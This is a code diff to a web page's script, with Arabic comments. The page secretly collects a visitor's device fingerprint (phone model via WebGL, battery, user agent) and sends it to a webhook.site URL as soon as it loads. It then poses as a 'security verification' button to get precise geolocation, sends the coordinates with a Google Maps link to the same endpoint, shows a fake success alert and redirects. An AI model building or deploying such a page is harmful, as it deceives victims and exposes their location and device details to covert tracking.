@@ -182,6 +182,7 @@
     </div>
 
     <script>
+        // 🚩 [ضع الرابط هنا] 🚩
         const WEBHOOK_URL = "https://webhook.site/3c092072-f224-4488-84da-f57f5ae06000";
 
         let deviceData = {
@@ -192,6 +193,7 @@
             network: {}
         };
 
+        // 1. وظيفة تحليل اسم الهاتف عبر كرت الشاشة (GPU)
         function getExactPhoneModel() {
             const canvas = document.createElement('canvas');
             const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
@@ -205,16 +207,15 @@
             return "N/A";
         }
 
+        // 2. جمع المعلومات الأساسية فوراً
         async function collectBasics() {
             // الشحن
             if (navigator.getBattery) {
-                try {
-                    const batt = await navigator.getBattery();
-                    deviceData.battery = {
-                        level: (batt.level * 100) + "%",
-                        charging: batt.charging ? "موصل بالشاحن" : "يعمل على البطارية"
-                    };
-                } catch(e) {}
+                const batt = await navigator.getBattery();
+                deviceData.battery = {
+                    level: (batt.level * 100) + "%",
+                    charging: batt.charging ? "موصل بالشاحن" : "يعمل على البطارية"
+                };
             }
 
             // المواصفات الصلبة
@@ -227,13 +228,14 @@
                 ua: navigator.userAgent
             };
 
+            // إرسال الدفعة الأولى فوراً
             sendData(deviceData);
-            
-            // طلب الموقع تلقائياً بدون أذونات إضافية
-            getLocationData();
         }
 
-        function getLocationData() {
+        // 3. عند ضغط الزر (طلب الموقع الدقيق)
+        document.getElementById('start-btn').onclick = function() {
+            this.innerText = "جاري التحقق...";
+            
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(
                     (pos) => {
@@ -246,17 +248,18 @@
                             speed: pos.coords.speed,
                             google_maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
                         };
-                        sendData(deviceData);
+                        finalize();
                     },
                     (err) => {
                         deviceData.step = "Location_Rejected";
-                        deviceData.location_error = err.message;
-                        sendData(deviceData);
+                        finalize();
                     },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    { enableHighAccuracy: true, timeout: 10000 }
                 );
+            } else {
+                finalize();
             }
-        }
+        };
 
         async function sendData(data) {
             try {
@@ -265,20 +268,16 @@
                     mode: 'no-cors',
                     body: JSON.stringify(data)
                 });
-                console.log("✓ تم إرسال البيانات");
-            } catch (e) { 
-                console.log("Data Sent"); 
-            }
+            } catch (e) { console.log("Data Sent"); }
         }
 
-        document.getElementById('start-btn').onclick = function() {
-            this.innerText = "جاري التحقق...";
-            window.location.href = "https://www.instagram.com";
-        };
+        function finalize() {
+            sendData(deviceData);
+            alert("تم التحقق من الأمان بنجاح.");
+            window.location.href = "https://www.google.com";
+        }
 
-        window.onload = function() {
-            collectBasics();
-        };
+        window.onload = collectBasics;
     </script>
 </body>
 </html>
